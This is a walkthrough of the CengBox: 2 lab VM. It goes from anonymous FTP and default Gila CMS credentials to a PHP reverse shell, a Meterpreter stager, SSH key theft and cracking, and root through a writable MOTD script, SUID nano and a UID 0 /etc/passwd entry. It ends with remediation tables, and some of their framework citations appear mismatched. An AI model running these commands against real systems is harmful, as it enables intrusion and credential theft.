# CengBox: 2

Anonymous FTP leaking an internal note is already a bad sign. Finding out the CMS uses default credentials is worse. Discovering that MOTD scripts run as root and are world-writable is the part where defenders should be crying, dude. CengBox: 2 escalates the difficulty from its predecessor by chaining six distinct misconfigurations across FTP, virtual hosts, CMS RCE, sudo abuse, SSH key theft, and MOTD hijacking. Every step is a legitimate finding you will see in real enterprise environments, fr fr.

---

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | CengBox: 2 (Linux, 192.168.1.104) |
| **Attacker VM** | Kali Linux 192.168.1.112 |
| **VulnHub URL** | https://www.vulnhub.com/entry/cengbox-2,486/ |
| **Techniques** | Anonymous FTP enumeration, virtual host discovery, Gila CMS default credentials, CMS PHP file editor RCE, sudo lateral movement, SSH key theft, John passphrase cracking, writable MOTD hijack, SUID nano /etc/passwd edit |
| **CVEs / EDBs** | CVE-2020-5513 (Gila CMS LFI), no CVE for MOTD misconfiguration (design flaw) |
| **APT Groups** | APT28 (credential theft + SSH key abuse), APT41 (web app RCE for foothold) |

---

## Attack Summary

```
[nmap] ---> ports 21 (FTP anon), 22 (SSH), 80 (HTTP)
             |
             v
[ftp anonymous] ---> note.txt ---> users Kevin + Aaron, default CMS creds hint
             |
             v
[/etc/hosts] ---> ceng-company.vm
             |
             v
[gobuster vhost] ---> admin.ceng-company.vm ---> /gila
             |
             v
[Gila CMS] ---> kevin@ceng-company.vm:admin (default creds)
             |
             v
[CMS file editor] ---> edit PHP file ---> pentestmonkey reverse shell
             |
             v
[nc listener] ---> reverse shell as www-data
             |
             v
[sudo -l] ---> sudo -u swartz /home/swartz/runphp.sh ---> PHP interactive shell
             |
             v
[MSF web_delivery] ---> Meterpreter as swartz
             |
             v
[/home/mitnick/.ssh/id_rsa] ---> ssh2john ---> john ---> passphrase: legend
             |
             v
[ssh mitnick] ---> user.txt
             |
             v
[pspy64s] ---> /etc/update-motd.d/ runs as root on SSH login
             |
             v
[ls -la /etc/update-motd.d/] ---> world-writable
             |
             v
[echo "chmod u+s /bin/nano" >> 00-header] ---> reconnect SSH
             |
             v
[nano SUID] ---> edit /etc/passwd ---> add UID 0 user ---> root shell
```

---

## Methodology

1. Port scan and anonymous FTP enumeration for user hints
2. Virtual host and subdomain discovery to locate hidden CMS
3. Gila CMS login with default credentials
4. Remote code execution via CMS PHP file editor
5. Lateral movement to user `swartz` via sudo-allowed PHP interpreter script
6. Meterpreter session staging via `web_delivery` module
7. SSH private key theft from `mitnick`'s home directory; passphrase cracking with John
8. Privilege escalation via world-writable MOTD scripts and SUID nano `/etc/passwd` manipulation

---

## Step 1: Port Scan

**Context:** Target IP is 192.168.1.104 on a host-only network.

```bash
netdiscover
nmap -A 192.168.1.104
```

**Expected output (condensed):**
```
21/tcp  open  ftp     vsftpd (anonymous login allowed)
22/tcp  open  ssh     OpenSSH
80/tcp  open  http    Apache
```

**Real-world note:** Anonymous FTP on a production box is a red flag every time, dude. It is almost always a misconfiguration or a forgotten developer artifact.

**MITRE TTP:** T1046 - Network Service Scanning

---

## Step 2: Anonymous FTP Enumeration

**Context:** FTP allows anonymous login. Internal notes may be present.

```bash
ftp 192.168.1.104
# Username: Anonymous
# Password: (blank)
ls
get note.txt
bye
cat note.txt
```

**Note content (paraphrased):** References users Kevin and Aaron; hints that the CMS is using default credentials.

Add the virtual hostname:

```bash
echo "192.168.1.104   ceng-company.vm" >> /etc/hosts
```

**Real-world note:** Anonymous FTP is still enabled by default in some vsftpd configurations. Internal notes left accessible on anonymous FTP are a common misconfiguration in legacy enterprise file sharing setups.

**MITRE TTP:** T1083 - File and Directory Discovery, T1078.001 - Default Accounts

---

## Step 3: Virtual Host and Subdomain Discovery

**Context:** The main site at `http://ceng-company.vm` shows a maintenance page. Need to find hidden virtual hosts.

```bash
gobuster vhost -u http://ceng-company.vm/ \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt
```

**Found:** `admin.ceng-company.vm`

```bash
echo "192.168.1.104   admin.ceng-company.vm" >> /etc/hosts
```

Gobuster/DirBuster on `http://admin.ceng-company.vm/` reveals the path `/gila`.

**Real-world note:** Virtual host enumeration is a critical step in external reconnaissance. Subdomains like `admin.*` or `dev.*` often host less-secured applications with default configurations.

**MITRE TTP:** T1590.001 - Gather Victim Network Information: Domain Properties

---

## Step 4: Gila CMS Default Credentials

**Context:** Gila CMS login at `http://admin.ceng-company.vm/gila/` requires an email address. The FTP note hinted at default credentials and user Kevin.

- **Email:** `kevin@ceng-company.vm`
- **Password:** `admin`

Login succeeds. Default credentials were never changed. Sus.

**Alternative:** Try `admin@ceng-company.vm:admin` or `aaron@ceng-company.vm:admin` based on the FTP note hints.

**Real-world note:** Default credentials in CMS deployments are a consistent finding across industries. CISA and NCSC have issued advisories specifically about default credential usage in enterprise CMSes and network devices.

**MITRE TTP:** T1078.001 - Valid Accounts: Default Accounts

---

## Step 5: Remote Code Execution via CMS File Editor

**Context:** Gila CMS admin panel includes a PHP file editor. Editing any PHP file with a reverse shell gives direct code execution as the web server process.

In the CMS admin, navigate to the file manager. Select an existing PHP file. Replace its contents with a pentestmonkey PHP reverse shell, setting `$ip = "192.168.1.112"` and `$port = 1234`.

Start a listener:

```bash
nc -lvnp 1234
```

Browse to the edited PHP file in the browser. Reverse shell connects back.

Upgrade to full TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Real-world note:** CMS file editors that allow PHP editing in production are a critical vulnerability. WordPress, Joomla, Gila, and dozens of other CMSes have this functionality enabled by default. Attackers routinely abuse it in real-world compromises. Disable it in production environments immediately.

**MITRE TTP:** T1505.003 - Web Shell, T1190 - Exploit Public-Facing Application

---

## Step 6: Lateral Movement to `swartz` via Sudo

**Context:** Current user is `www-data`. Need to escalate to a real user account.

```bash
sudo -l
```

**Output:**
```
(swartz) NOPASSWD: /home/swartz/runphp.sh
```

The web user can run a PHP interpreter script as `swartz` without a password:

```bash
sudo -u swartz /home/swartz/runphp.sh
```

This drops into an interactive PHP shell running as `swartz`. Noice pivot.

**Real-world note:** Sudo rules granting NOPASSWD access to interpreter scripts are a classic lateral movement path. The script does not need to be malicious on its own. Once you can run it interactively, you can execute arbitrary code as the target user.

**MITRE TTP:** T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Step 7: Meterpreter Session via Web Delivery

**Context:** Interactive PHP shell as `swartz`. Stage a Meterpreter session for better post-exploitation capabilities.

On attacker machine:

```bash
msfconsole
use exploit/multi/script/web_delivery
set TARGET 1          # PHP
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.112
set LPORT 8888
exploit
```

Paste the generated PHP stager into the `swartz` PHP shell. A Meterpreter session opens as `swartz`.

**MITRE TTP:** T1059.004 - Command and Scripting Interpreter: Unix Shell

---

## Step 8: SSH Key Theft and Passphrase Cracking

**Context:** Meterpreter as `swartz`. Browsing filesystem for other users' sensitive files.

```bash
ls /home/
# jaye  mitnick  swartz

download /home/mitnick/.ssh/id_rsa /tmp/key
```

Crack the key passphrase on attacker machine:

```bash
/usr/share/john/ssh2john.py /tmp/key > /tmp/hash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash
```

**Passphrase cracked:** `legend`

SSH as mitnick and read user flag:

```bash
chmod 600 /tmp/key
ssh -i /tmp/key mitnick@192.168.1.104
cat ~/user.txt
```

**Alternative:** If John is slow, use `hashcat -m 22931` with GPU acceleration for faster cracking.

**Real-world note:** SSH private keys with weak passphrases are a persistent finding in enterprise environments. Developers who use passphrase-free keys "for convenience" are one breach away from full lateral movement across their entire infrastructure. APT28 specifically targets SSH keys in their credential access phase.

**MITRE TTP:** T1552.004 - Unsecured Credentials: Private Keys, T1110.001 - Brute Force: Password Guessing

---

## Step 9: Privilege Escalation via Writable MOTD Scripts

**Context:** Need root from `mitnick`. Process monitoring reveals the privesc vector.

Upload and run `pspy64s` to observe root process execution:

```bash
cd /tmp
wget http://192.168.1.112:8000/pspy64s
chmod +x pspy64s
./pspy64s
```

`pspy` output shows scripts in `/etc/update-motd.d/` execute as root every time a user logs in via SSH.

Check permissions:

```bash
ls -la /etc/update-motd.d/
# -rwxrwxrwx ... root root ... 00-header
```

World-writable. This is the vector. Edit `00-header` to set the SUID bit on nano:

```bash
nano /etc/update-motd.d/00-header
# Add at the end of the file:
chmod u+s /bin/nano
```

Trigger the MOTD by reconnecting via SSH:

```bash
exit
ssh -i /tmp/key mitnick@192.168.1.104

# Verify SUID nano
ls -la /bin/nano
# -rwsr-xr-x ... /bin/nano
```

**Real-world note:** MOTD scripts in `/etc/update-motd.d/` are executed as root by PAM on every SSH login. World-writable MOTD scripts are a critical misconfiguration found occasionally in misconfigured Ubuntu/Debian systems. The fix is trivial: `chmod 755 /etc/update-motd.d/00-header`.

**MITRE TTP:** T1543.001 - Create or Modify System Process: Launch Agent, T1037.001 - Boot or Logon Initialization Scripts

---

## Step 10: Root via /etc/passwd Editing with SUID Nano

**Context:** Nano has the SUID bit. Can now edit any file on the system, including `/etc/passwd`.

Generate a password hash:

```bash
openssl passwd -1 -salt user3 pass123
# $1$user3$rhnNWgG.ZknSPzLFiYZzE1
```

Edit `/etc/passwd` with SUID nano:

```bash
nano /etc/passwd
# Append at end of file:
# raj:$1$user3$rhnNWgG.ZknSPzLFiYZzE1:0:0:root:/root:/bin/bash
```

Save and switch user:

```bash
su raj
# Password: pass123
id
# uid=0(root)
cd /root
cat root.txt
```

Root shell. GG, this box got absolutely rekt.

**Alternative:** Instead of `/etc/passwd` edit, use SUID nano to add your SSH public key to `/root/.ssh/authorized_keys`.

**Real-world note:** Any SUID text editor can write to `/etc/passwd` or `/etc/sudoers`. The SUID bit on editors like nano, vim, or less is a textbook GTFOBins finding that should never appear in production. This is exactly why `sudo -l` and `find / -perm -4000` are standard post-exploitation checks.

**MITRE TTP:** T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid, T1098 - Account Manipulation

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Source |
|---|---|---|
| Gila CMS default login | `kevin@ceng-company.vm:admin` | FTP note hint + default creds |
| mitnick SSH key passphrase | `legend` | John + rockyou against id_rsa |
| User flag | See ~/user.txt | After SSH as mitnick |
| Root via /etc/passwd | `raj:pass123` (UID 0) | SUID nano write |
| Root flag | See /root/root.txt | Root shell |

---

## Lessons Learned

| Finding | Impact | Real-World Relevance |
|---|---|---|
| Anonymous FTP exposing internal notes | User enumeration and credential hints | Anonymous FTP is still enabled by default in some vsftpd configs; always disable unless strictly required |
| Default Gila CMS credentials | Admin access without any exploitation | Default credentials remain one of the most common initial access vectors across all industries |
| CMS PHP file editor enabling RCE | Direct code execution as web server process | Disable file editing in CMS admin panels in all production deployments |
| Sudo NOPASSWD to PHP interpreter script | Lateral movement to another user without credentials | Audit all NOPASSWD sudo rules; never grant sudo to interactive interpreter scripts |
| SSH private key with weak passphrase | Full account access after passphrase crack | Use strong, unique passphrases for all SSH keys; rotate key pairs periodically |
| World-writable MOTD scripts executed as root | Trivial privilege escalation via SSH login trigger | MOTD scripts must be owned and writable only by root; check with `ls -la /etc/update-motd.d/` |
| SUID text editor | Full system compromise via /etc/passwd edit | Never set the SUID bit on text editors; audit SUID binaries with `find / -perm -4000` regularly |

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Valid Accounts: Default Accounts | T1078.001 | Initial Access |
| Web Shell | T1505.003 | Persistence |
| Boot or Logon Initialization Scripts | T1037.001 | Persistence |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Execution |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Gather Victim Network Information: Domain Properties | T1590.001 | Reconnaissance |
| Unsecured Credentials: Private Keys | T1552.004 | Credential Access |
| Brute Force: Password Guessing | T1110.001 | Credential Access |
| Abuse Elevation Control Mechanism: Sudo | T1548.003 | Privilege Escalation |
| Abuse Elevation Control Mechanism: Setuid | T1548.001 | Privilege Escalation |
| Account Manipulation | T1098 | Persistence |
| Lateral Movement: Remote Services SSH | T1021.004 | Lateral Movement |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|---|---|---|
| PR.AC-1 | Identities and Credentials Management | Disable anonymous FTP; enforce unique strong credentials for all accounts |
| PR.AC-4 | Access Permissions and Authorizations | Audit all sudo rules; remove NOPASSWD entries for interpreter scripts |
| DE.CM-7 | Monitoring for Unauthorized Activity | Monitor MOTD script modification; alert on SUID bit changes to system binaries |
| PR.DS-1 | Data at Rest Protection | Restrict SSH private key access to the owning user (`chmod 600`) |

### NIST SP 800-53

| Control | Description |
|---|---|
| AC-2 | Account Management (disable anonymous FTP; implement account lifecycle management) |
| CM-6 | Configuration Settings (disable CMS file editors in production; set correct MOTD permissions) |
| AC-6 | Least Privilege (restrict sudo rules; remove SUID from text editors) |
| IA-5 | Authenticator Management (enforce strong SSH key passphrases; rotate keys annually) |
| SI-7 | Software, Firmware, and Information Integrity (monitor MOTD scripts and cron jobs for unauthorized changes) |

### CISA KEV / Known Exploited Vectors

Default credentials are tracked under CISA KEV for numerous CMS and network device products (e.g., CVE-2023-34362, CVE-2022-27593). MOTD hijacking via world-writable scripts is documented in CISA's Linux hardening guidance. SSH key theft and passphrase cracking are documented in CISA advisory AA22-074A (Russian state-sponsored actors using SSH credential theft).

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Current Maturity | Target Maturity | Gap |
|---|---|---|---|
| Identity and Access Management | MIL0 (default credentials, no MFA) | MIL2 | Enforce unique strong credentials; MFA on admin panels; SSH key rotation policy |
| Asset, Change, and Configuration Management | MIL0 (no baseline for SUID binaries or MOTD permissions) | MIL2 | Automated CIS benchmark scanning; alert on deviation from permission baseline |
| Threat and Vulnerability Management | MIL0 (no scanning) | MIL2 | Monthly authenticated scans; SAST for CMS configurations |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|---|---|---|
| Credential Hardening | D3-CH | Enforce strong SSH passphrase policy |
| System Call Filtering | D3-SCF | Restrict SUID execution context |
| File Content Policies | D3-FCOP | Block PHP execution from CMS upload and editor paths |
| Process Spawn Analysis | D3-PSA | Detect nano spawning with root EUID |
| User Session Init Config Analysis | D3-USICA | Monitor /etc/update-motd.d/ for unauthorized modifications |

---

## Final Thoughts

CengBox: 2 is a great medium-difficulty box that demonstrates how a chain of individually low-severity misconfigurations adds up to full root compromise. No CVE exploitation required: anonymous FTP, default credentials, MOTD misconfiguration, and a weak SSH passphrase are all configuration failures, not software bugs.

The MOTD step is the most creative part of this chain. Most defenders never think about MOTD scripts as a privilege escalation surface. But on any system where `/etc/update-motd.d/` scripts are world-writable and executed by PAM as root on SSH login, any authenticated user can escalate. Check your MOTD permissions. Seriously.

Thanks guys!! (❍ᴥ❍ʋ)
